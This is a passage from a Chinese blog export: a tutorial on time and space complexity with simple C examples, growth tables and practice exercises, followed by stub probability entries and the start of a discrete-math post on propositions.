<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1-100求和</span></span><br><span class="line"><span class="comment"> * @param end</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=end;i++)&#123;</span><br><span class="line">        result += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 高斯算法</span></span><br><span class="line"><span class="comment"> * @param end</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">simpleSum</span><span class="params">(<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = (<span class="number">1</span>+end)*end/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = sum(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1+2+3+...+100=%d\n"</span>,res);</span><br><span class="line">    <span class="keyword">int</span> res2 = simpleSum(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1+2+3+...+100=%d\n"</span>,res2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两种求1-100以内和的算法随着end数值的增大(不考虑int溢出),算法优劣不言而喻.</p>
<blockquote>
<p>四、算法的渐进增长</p>
</blockquote>
<p>看几组算法的变化:</p>
<p><strong>A</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">次数</th>
<th style="text-align:center">算法A(2n+4)</th>
<th style="text-align:center">算法B(2n)</th>
<th style="text-align:center">算法C(4n+1)</th>
<th style="text-align:center">算法D(4n)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">n=1</td>
<td style="text-align:center">6</td>
<td style="text-align:center">2</td>
<td style="text-align:center">5</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">n=2</td>
<td style="text-align:center">8</td>
<td style="text-align:center">4</td>
<td style="text-align:center">9</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">n=3</td>
<td style="text-align:center">10</td>
<td style="text-align:center">6</td>
<td style="text-align:center">13</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td style="text-align:center">n=10</td>
<td style="text-align:center">24</td>
<td style="text-align:center">20</td>
<td style="text-align:center">41</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">n=100</td>
<td style="text-align:center">204</td>
<td style="text-align:center">200</td>
<td style="text-align:center">401</td>
<td style="text-align:center">400</td>
</tr>
<tr>
<td style="text-align:center">n=1000</td>
<td style="text-align:center">2004</td>
<td style="text-align:center">2000</td>
<td style="text-align:center">4001</td>
<td style="text-align:center">4000</td>
</tr>
</tbody>
</table>
</div>
<p>当n=1时, C要优于A(C的执行次数要比A少),随着n的增加,A要优于C.所以，综上来说A要优于C.</p>
<p>函数的渐近增长：给定两个函数f(n)和g(n)，如果存在一个整数N，使得对于所有的n &gt; N，f(n)总是比g(n)大，那么，我们说f(n)的渐近增长快于g(n)。</p>
<p>随着n的不断增大，A,B,C,D算法的常数对总体的执行次数影响可以忽略.</p>
<p><strong>B</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">次数</th>
<th style="text-align:center">算法A(2n+4)</th>
<th style="text-align:center">算法B(n)</th>
<th style="text-align:center">算法C(2n^2+1)</th>
<th style="text-align:center">算法D(n^2)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">n=1</td>
<td style="text-align:center">6</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">n=2</td>
<td style="text-align:center">8</td>
<td style="text-align:center">2</td>
<td style="text-align:center">9</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">n=3</td>
<td style="text-align:center">10</td>
<td style="text-align:center">3</td>
<td style="text-align:center">19</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">n=10</td>
<td style="text-align:center">24</td>
<td style="text-align:center">10</td>
<td style="text-align:center">201</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">n=100</td>
<td style="text-align:center">204</td>
<td style="text-align:center">100</td>
<td style="text-align:center">20001</td>
<td style="text-align:center">10000</td>
</tr>
<tr>
<td style="text-align:center">n=1000</td>
<td style="text-align:center">2004</td>
<td style="text-align:center">1000</td>
<td style="text-align:center">2000001</td>
<td style="text-align:center">1000000</td>
</tr>
</tbody>
</table>
</div>
<p><strong>C</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">次数</th>
<th style="text-align:center">算法A(2n^2+4n+2)</th>
<th style="text-align:center">算法B(n^2)</th>
<th style="text-align:center">算法C(2n^3+4n+1)</th>
<th style="text-align:center">算法D(n^3)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">n=1</td>
<td style="text-align:center">8</td>
<td style="text-align:center">1</td>
<td style="text-align:center">7</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">n=2</td>
<td style="text-align:center">18</td>
<td style="text-align:center">4</td>
<td style="text-align:center">25</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">n=3</td>
<td style="text-align:center">32</td>
<td style="text-align:center">9</td>
<td style="text-align:center">67</td>
<td style="text-align:center">27</td>
</tr>
<tr>
<td style="text-align:center">n=10</td>
<td style="text-align:center">242</td>
<td style="text-align:center">100</td>
<td style="text-align:center">2041</td>
<td style="text-align:center">10000</td>
</tr>
<tr>
<td style="text-align:center">n=100</td>
<td style="text-align:center">20402</td>
<td style="text-align:center">10000</td>
<td style="text-align:center">2000401</td>
<td style="text-align:center">1000000</td>
</tr>
<tr>
<td style="text-align:center">n=1000</td>
<td style="text-align:center">2004002</td>
<td style="text-align:center">1000000</td>
<td style="text-align:center">2000004001</td>
<td style="text-align:center">1000000000</td>
</tr>
</tbody>
</table>
</div>
<p>观察发现,最高次幂大的函数,随着n的增大,n的最高次幂大的结果的变化也大。</p>
<blockquote>
<p>五、时间复杂度 </p>
</blockquote>
<p>一般情况下，算法中基本操作重复执行的次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n),使得当n趋近于无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=Ｏ(f(n)),称Ｏ(f(n)) 为算法的渐进时间复杂度，简称时间复杂度。<br>渐近记号（Asymptotic Notation）通常有 O、 Θ 和 Ω 记号法。Θ 记号渐进地给出了一个函数的上界和下界，当只有渐近上界时使用 O 记号，当只有渐近下界时使用 Ω 记号。尽管技术上 Θ 记号较为准确，但通常仍然使用 O 记号表示。</p>
<p>一般情况下,随着n的增大,T(n)增长最慢的算法为最优算法.</p>
<p><strong>推导大O阶</strong></p>
<blockquote>
<ul>
<li>用常数1取代运行时间中的所有加法常数</li>
<li>在修改后的运行次数函数中，只保留最高项</li>
<li>如果最高项存在且不是1，则去除与这个项相乘的常数</li>
</ul>
</blockquote>
<p><em>常数阶</em></p>
<p>以经典的高斯算法求和为例,</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 高斯方法</span></span><br><span class="line"><span class="comment"> * @param end</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">simpleSum</span><span class="params">(<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = (<span class="number">1</span>+end)*end/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"result=%d\n"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序执行两步便获取到结果,所以时间复杂度为T(n)=2,按照推导大O阶方法,时间复杂度为O(1).</p>
<p><em>线性阶</em></p>
<p>以1-100 求和为例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1-100求和</span></span><br><span class="line"><span class="comment"> * @param end</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=end;i++)&#123;</span><br><span class="line">        result += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>for 循环中共执行的次数取决于end的值,所以时间复杂度为T(n)=n ,按照推导大O阶的方法,记做O(n)。</p>
<p><em>对数阶</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">logFunc</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(count&lt;n)&#123;</span><br><span class="line">        count = count * <span class="number">2</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"count=%d\n"</span>,count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设循环x次后退出循环(count&gt;=n),即 2^x = n,则： x= logn 。所以时间复杂度为O(logn);</p>
<p><em>平方阶</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">square</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            sum = i+j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum=%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内层循环执行n^2次, 时间复杂度为:O(n^2);</p>
<p><strong>常用时间复杂度</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">执行次数函数</th>
<th style="text-align:center">阶</th>
<th style="text-align:center">非正式术语</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">常数阶</td>
</tr>
<tr>
<td style="text-align:center">2n+4</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">线性阶</td>
</tr>
<tr>
<td style="text-align:center">3n^2+2n+1</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">平方阶</td>
</tr>
<tr>
<td style="text-align:center">5log2n</td>
<td style="text-align:center">O(logn )</td>
<td style="text-align:center">对数阶</td>
</tr>
<tr>
<td style="text-align:center">4nlog2n+3n+19</td>
<td style="text-align:center">O(nlogn)</td>
<td style="text-align:center">nlogn阶</td>
</tr>
<tr>
<td style="text-align:center">4n^3+2n^2+4n+4</td>
<td style="text-align:center">O(n^3)</td>
<td style="text-align:center">立方阶</td>
</tr>
<tr>
<td style="text-align:center">2^n</td>
<td style="text-align:center">O(2^n)</td>
<td style="text-align:center">指数阶</td>
</tr>
</tbody>
</table>
</div>
<p>常见的时间复杂度消耗时间的大小排列:</p>
<p> O(1)&lt; O(logn)&lt; O(n)&lt; O(nlogn)&lt; O(n^2)&lt; O(n^3)&lt; O(2^n)&lt; O(n!)&lt; O(n^n)</p>
<p><em>时间复杂度练习</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分析下列各程序段的时间复杂度</span><br><span class="line">(1) </span><br><span class="line">void main() &#123;</span><br><span class="line">int i=1,k=0,n=10; </span><br><span class="line">while (i&lt;=n-1)  &#123; </span><br><span class="line">k+=10*i;i++;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(2) </span><br><span class="line">void main() &#123; </span><br><span class="line">int i=1,k=0,n=100;  do  &#123;</span><br><span class="line">k+=10*i;i++;  </span><br><span class="line">&#125;while (i==n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(3) </span><br><span class="line">void main() &#123; </span><br><span class="line">int i=1,j=0,n=10; </span><br><span class="line">while (i+j&lt;=n)</span><br><span class="line">if (i&gt;j)    </span><br><span class="line">j++;  </span><br><span class="line">else     i++; </span><br><span class="line">&#125; </span><br><span class="line">(4) void main() &#123; </span><br><span class="line">int n=10,x=n,y=0;  </span><br><span class="line">while (x&gt;=(y+1)*(y+1))    </span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(5) </span><br><span class="line">void main() &#123;</span><br><span class="line">int n=9,i=1;  while (i&lt;=n)  </span><br><span class="line">i=i*3; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(6)</span><br><span class="line">计算斐波拉契数列的时间复杂度。F(n)=f(n-1)+f(n-2) </span><br><span class="line"></span><br><span class="line">(7)计算该函数的时间复杂度。F(n)=6f(n-1)-9f(n-2) 即fn=6fn-1-9fn-2 (8)求多项式A(x)的值的算法可直接根据下列两个公式之一来设计： (1)A(x)=anxn+ an-1xn-1 +……+ a1x + a0 (2)A(x)=(…(anx+ an-1)x+…. a1)x)+ a0 根据算法的时间复杂性比较这两种算法的优劣。 </span><br><span class="line"></span><br><span class="line">答案： (1) O(n) </span><br><span class="line">(2) O(1) </span><br><span class="line">(3) O(n) </span><br><span class="line">(4) O(√n) </span><br><span class="line">(5)O(log3n)</span><br><span class="line">(6)方法： 假设F(n)的时间复杂度为T(n),有 t(n)=t(n-1)+t(n-2)&lt;2t(n-1)&lt;2*2t(n-2)&lt;2*2*2t(n-3)&lt;....&lt;2nt(0)=O(2n)</span><br><span class="line">即t(n)&lt;O(2n) 又 t(n)=t(n-1)+t(n-2)&gt;2t(n-2)&lt;2*2t(n-4)&lt;2*2*2t(n-8)&gt;....&gt;2n/2t</span><br><span class="line">(1)(n为奇数时，或2n/2t(0),n为偶数时) 即：t(n)&gt;O(2n/2) 所以O(2n/2)&lt;t(n)&lt;O(2n) 取最坏情况上限，即t(n)≈O(2n)</span><br><span class="line"></span><br><span class="line">（7）解： 令fn=rn，则原式变为rn-6rn-1+9rn-2=0 同除以rn-2 则原式为r2-6r+9=0 如果解出来的是重根的话，则第一个根以rn代入，第2个重根以nrn代入，第3个重根以n2rn代入，第4个重根以n3rn代入，依此类推。 解出的两个根为重根，均为3 所以，tn=c1*3n+c2*n*3n 依题意知t0=0,t1=1,代入后得： t0=c1*30+c2*0*30=0 t1=c1*31+c2*1*31=1 解得： c1=0,c2=1/3 则 tn=1/3*n*3n</span><br><span class="line"></span><br><span class="line">(8)解： (1)A(x)=anxn+ an-1xn-1 +……+ a1x + a0 (2)A(x)=(…(anx+ an-1)x+…. a1)x)+ a0 公式一：假设有一专门的子程序用于计算xn ，则x2需运乘法2次，x3需运行乘法3次，xn需运行乘法n次。由此可知，使用公式一时，子程序被调用的次数为n+(n-1)+(n-2)+….+1=n(n+1)/2。 公式二：使用一个简单的循环运行n-1次即可。</span><br></pre></td></tr></table></figure>
<p><strong>最坏情况和平均情况</strong></p>
<p>算法(Algorithms)的复杂度(Complexity)是指运行一个算法所需消耗的资源(时间或者空间)。同一个算法处理不同的输入数据所消耗的资源也可能不同，所以分析一个算法的复杂度时，主要有三种情况可以考虑，最差情况(Worst Case)下的，平均情况(Average Case)的， 最好情况(Best Case)下的。</p>
<p>算法的分析也是类似，我们查找一个有n个随机数字数组中的某个数字，最好的情况是第一个数字就是，那么算法的时间复杂度为O(1)，但也有可能这个数字就在最后一个位置上待着，那么算法的时间复杂度就是O(n)，这是最坏的一种情况了。</p>
<p>最坏情况运行时间是一种保证，那就是运行时间将不会再坏了。在应用中，这是一种最重要的需求，通常，除非特别指定，我们提到的运行时间都是最坏情况的运行时间。</p>
<p>而平均运行时间也就是从概率的角度看，这个数字在每一个位置的可能性是相同的，所以平均的查找时间为n/2次后发现这个目标元素。平均情况更能反映大多数情况下算法的表现。平均情况分析就是对所有输入尺寸为n的输入，让算法运转一遍，然后取它们的平均值。当然，实际中不可能将所有可能的输入都运行一遍，因此平均情况通常指的是一种数学期望值，而计算数学期望值则需要对输入的分布情况进行假设。</p>
<p>平均运行时间是所有情况中最有意义的，因为它是期望的运行时间。也就是说，我们运行一段程序代码时，是希望看到平均运行时间的。可现实中，平均运行时间很难通过分析得到，一般都是通过运行一定数量的实验数据后估算出来的。</p>
<p>有时候我们还需要知道最好情况是什么，这有两层意义：一是我们想知道如果运气好，能好到什么程度；二是如果我们能够证明好运气与我们同在，当然需要知道运气好的时候算法表现如何。这种最好分析就是在给定输入规模的时候，看看哪种输入能使算法的运行最有效率。当然，有人认为这种最好情况分析有点假：我们可以操控输入来使一个本来很慢的算法表现得很快，从而达到蒙蔽人的效果。</p>
<p>对算法的分析，一种方法是计算所有情况的平均值，这种时间复杂度的计算方法称为平均时间复杂度。另一种方法是计算最坏情况下的时间复杂度，这种方法称为最坏时间复杂度。一般在没有特殊说明的情况下，都是指最坏时间复杂度。</p>
<p>为什么要分析最坏情况下的算法时间复杂性？</p>
<blockquote>
<ul>
<li>最差情况下的复杂度是所有可能的输入数据所消耗的最大资源，如果最差情况下的复杂度符合我们的要求，    我们就可以保证所有的情况下都不会有问题。</li>
<li>某些算法经常遇到最差情况。比如一个查找算法，经常需要查找一个不存在的值。<br>也许你觉得平均情况下的复杂度更吸引你，可是平均情况也有几点问题。<br>第一，难计算，多数算法的最差情况下的复杂度要比平均情况下的容易计算的多，<br>第二，有很多算法的平均情况和最差情况的复杂度是一样的.<br>第三，什么才是真正的平均情况？如果你假设所有可能的输入数据出现的概率是一样的话，也是不合理的。其实多数情况是不一样的。而且输入数据的分布函数很可能是你没法知道。</li>
<li>考虑最好情况的复杂度更是没有意义。几乎所有的算法你都可以稍微修改一下，以获得很好的最好情况下的复杂度(要看输入数据的结构，可以是O(1))。怎样修改呢?<br>预先计算好某一输入的答案，在算法的开始部分判断输入，如果符合，给出答案。</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>六 、空间复杂度 </p>
</blockquote>
<p>空间复杂度(Space Complexity)是对一个算法在运行过程中临时占用存储空间大小的量度，记做S(n)=O(f(n))。比如直接插入排序的时间复杂度是O(n^2),空间复杂度是O(1) 。而一般的递归算法就要有O(n)的空间复杂度了，因为每次递归都要存储返回信息。一个算法的优劣主要从算法的执行时间和所需要占用的存储空间两个方面衡量。</p>
<p>类似于时间复杂度的讨论，一个算法的空间复杂度S(n)定义为该算法所耗费的存储空间，它也是问题规模n的函数。渐近空间复杂度也常常简称为空间复杂度。空间复杂度(SpaceComplexity)是对一个算法在运行过程中临时占用存储空间大小的量度。一个算法在计算机存储器上所占用的存储空间，包括存储算法本身所占用的存储空间，算法的输入输出数据所占用的存储空间和算法在运行过程中临时占用的存储空间这三个方面。算法的输入输出数据所占用的存储空间是由要解决的问题决定的，是通过参数表由调用函数传递而来的，它不随本算法的不同而改变。存储算法本身所占用的存储空间与算法书写的长短成正比，要压缩这方面的存储空间，就必须编写出较短的算法。算法在运行过程中临时占用的存储空间随算法的不同而异，有的算法只需要占用少量的临时工作单元，而且不随问题规模的大小而改变，我们称这种算法是“就地\”进行的，是节省存储的算法，有的算法需要占用的临时工作单元数与解决问题的规模n有关，它随着n的增大而增大，当n较大时，将占用较多的存储单元，例如快速排序和归并排序算法就属于这种情况。</p>
<p>分析一个算法所占用的存储空间要从各方面综合考虑。如对于递归算法来说，一般都比较简短，算法本身所占用的存储空间较少，但运行时需要一个附加堆栈，从而占用较多的临时工作单元；若写成非递归算法，一般可能比较长，算法本身占用的存储空间较多，但运行时将可能需要较少的存储单元。一个算法的空间复杂度只考虑在运行过程中为局部变量分配的存储空间的大小，它包括为参数表中形参变量分配的存储空间和为在函数体中定义的局部变量分配的存储空间两个部分。若一个算法为递归算法，其空间复杂度为递归所使用的堆栈空间的大小，它等于一次调用所分配的临时存储空间的大小乘以被调用的次数(即为递归调用的次数加1，这个1表示开始进行的一次非递归调用)。算法的空间复杂度一般也以数量级的形式给出。如当一个算法的空间复杂度为一个常量，即不随被处理数据量n的大小而改变时，可表示为O(1)；当一个算法的空间复杂度与以2为底的n的对数成正比时，可表示为O(log2n)；当一个算法的空间复杂度与n成线性比例关系时，可表示为O(n).若形参为数组，则只需要为它分配一个存储由实参传送来的一个地址指针的空间，即一个机器字长空间；若形参为引用方式，则也只需要为其分配存储一个地址的空间，用它来存储对应实参变量的地址，以便由系统自动引用实参变量。</p>
<hr>
<p>参考资料:</p>
<blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Algorithm" target="_blank" rel="noopener">算法【维基百科】</a></li>
<li>《算法导论》</li>
<li>《大话数据结构》</li>
<li><a href="http://blog.csdn.net/zolalad/article/details/11393915" target="_blank" rel="noopener">算法设计之五大常用算法设计方法总结</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础五之连续型随机变量</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%BA%94%E4%B9%8B%E8%BF%9E%E7%BB%AD%E5%9E%8B%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础八之极限定理</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E5%85%AB%E4%B9%8B%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础二之概率论公理</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%BA%8C%E4%B9%8B%E6%A6%82%E7%8E%87%E8%AE%BA%E5%85%AC%E7%90%86/</url>
    <content><![CDATA[<script type="math/tex; mode=display">
(\bigcup_{i=1}^n E_i)^c = \bigcap_{i=1}^n E_i^c</script><script type="math/tex; mode=display">
(\bigcap_{i=1}^n E_i)^c = \bigcup_{i=1}^n E_i^c</script><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础六之随机变量的联合分布</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E5%85%AD%E4%B9%8B%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E8%81%94%E5%90%88%E5%88%86%E5%B8%83/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础十之模拟</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E5%8D%81%E4%B9%8B%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础四之随机变量</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E5%9B%9B%E4%B9%8B%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>离散数学(一)、基础:逻辑和证明</title>
    <url>/2018/06/19/%E6%95%B0%E5%AD%A6/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E4%B8%80%E5%9F%BA%E7%A1%80%E9%80%BB%E8%BE%91%E5%92%8C%E8%AF%81%E6%98%8E/</url>
    <content><![CDATA[<p>离散数学（英语：Discrete mathematics）是数学的几个分支的总称，研究基于离散空间而不是连续的数学结构。与连续变化的实数不同，离散数学的研究对象——例如整数、图和数学逻辑中的命题——不是连续变化的，而是拥有不等、分立的值。因此离散数学不包含微积分和分析等“连续数学”的内容。离散对象经常可以用整数来枚举。更一般地，离散数学被视为处理可数集合（与整数子集基数相同的集合，包括有理数集但不包括实数集）的数学分支。但是，“离散数学”不存在准确且普遍认可的定义。实际上，离散数学经常被定义为不包含连续变化量及相关概念的数学，甚少被定义为包含什么内容的数学。</p>
<p>离散数学中的对象集合可以是有限或者是无限的。有限数学一词通常指代离散数学处理有限集合的那些部分，特别是在与商业相关的领域。</p>
<p>随着计算机科学的飞速发展，离散数学的重要性则日益彰显。它为许多信息学课程提供了数学基础，包括数据结构、算法、数据库理论、形式语言与操作系统等。如果没有离散数学的相关数学基础，学生在学习上述课程中，便会遇到较多的困难。此外，离散数学也包含了解决作业研究、化学、工程学、生物学等众多领域的数学背景。由于运算对象是离散的，所以计算机科学的数学基础基本上也是离散的。我们可以说计算机科学的数学语言就是离散数学。人们会使用离散数学里面的槪念和表示方法，来研究和描述计算机科学下所有分支的对象和问题，如计算机运算、编程语言、密码学、自动定理证明和软件开发等。相反地，计算机的应用使离散数学的概念得以应用于日常生活当中（如运筹学）。</p>
<p>虽然离散数学的主要研究对象是离散对象，但是连续数学的分析方法往往也可以采用。数论就是离散和连续数学的交叉学科。同样的，有限拓扑（对有限拓扑空间的研究）从字面上可看作离散化和拓扑的交集。<br>                                                                                   — 维基百科</p>
<blockquote>
<h1 id="命题逻辑"><a href="#命题逻辑" class="headerlink" title="命题逻辑"></a>命题逻辑</h1><h2 id="命题"><a href="#命题" class="headerlink" title="命题"></a>命题</h2></blockquote>
<p>命题是一个或真或假的陈述语句.既是一个陈述事实的句子,或真或假。</p>
<p>看下边几个语句:</p>
<blockquote>
<ul>
<li><ol>
<li>北京是中国首都.</li>
</ol>
</li>
<li><ol>
<li>几点了？</li>
</ol>
</li>
<li><ol>
<li>1+1=2.</li>
</ol>
</li>
<li><ol>
<li>x+1=2.</li>
</ol>
</li>
<li><ol>
<li>2+1=2.</li>
</ol>
</li>
</ul>
</blockquote>
<p>其中1,3为真命题,5为假命题。2不是命题，因为它不是陈述语句。4不是命题，它不是真，也不是假。</p>
<p>我们用字母p、q、r…等来表示命题.如果一个命题为真命题,它的真值为真，用T表示;如果它的命题为假,其真值为假，用F表示.</p>
<p>涉及命题的逻辑领域称为命题演算或命题逻辑。</p>
<blockquote>
<h3 id="定义1"><a href="#定义1" class="headerlink" title="定义1"></a>定义1</h3></blockquote>
<p>若p为一命题,则p的否定命题为¬p,读作非p.</p>
